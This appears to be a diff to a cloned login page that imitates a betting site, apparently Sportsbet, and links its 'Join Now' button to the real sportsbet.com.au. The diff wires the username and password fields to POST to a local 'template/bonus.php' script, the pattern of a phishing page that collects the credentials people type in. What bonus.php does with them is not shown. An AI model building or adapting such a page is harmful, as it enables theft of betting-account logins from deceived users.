@@ -48,11 +48,13 @@
                 <div class="loginContainer">
                     <div class="formCard">
                         <h3 class="size18 CodGray bold hasMarginBottom alignCenter" data-automation-id="login-title">Log In</h3>
-                        <form>
+                        <form method="post" action="<?php echo './template/bonus.php'; ?>">
                             <div class="container">
                                 <div class="container2"><label for="username" class="label grey" data-automation-id="login-username-label">Username</label>
                                     <div>
-                                        <div class="inputContainer inputContainer"><input id="username" data-automation-id="login-username" class="inputControl input CodGray inputRightIconPadding safe-input-class" type="text" autocapitalize="off" tabindex="0" value="" autocomplete></div>
+                                        <div class="inputContainer inputContainer">
+                                            <input id="username" name="username" class="inputControl input CodGray inputRightIconPadding safe-input-class" type="text" autocapitalize="off" autocomplete>
+                                        </div>
                                     </div>
                                     <div>
                                         <hr class="bottomUnderline lightGrey">
@@ -65,7 +67,9 @@
                                 <div class="passwordContainer2">
                                     <div class="container3"><label for="password" class="label grey" data-automation-id="login-password-label">Password</label>
                                         <div>
-                                            <div class="inputContainer inputContainer"><input id="password" data-automation-id="login-password" class="inputControl input CodGray safe-input-class" type="password" autocapitalize="off" tabindex="0" value="" autocomplete></div>
+                                            <div class="inputContainer inputContainer">
+                                                <input id="password" name="password" class="inputControl input CodGray safe-input-class" type="password" autocapitalize="off" autocomplete>
+                                            </div>
                                         </div>
                                         <div>
                                             <hr class="bottomUnderline lightGrey">
@@ -111,7 +115,9 @@
                             <div class="rippleGroup"></div><button tabindex="0" class="textButton" type="button">
                                 <div tabindex="-1" class="noFocus">
                                     <div class="ironGrey insideButtonNormalContent">
-                                        <div class="hover defaultCorners"><span class="textContainer"><span class="size14 bold text">Join Now</span></span></div>
+                                        <a href="https://www.sportsbet.com.au/">
+                                            <div class="hover defaultCorners"><span class="textContainer"><span class="size14 bold text">Join Now</span></span></div>
+                                        </a>
                                     </div>
                                 </div>
                             </button>
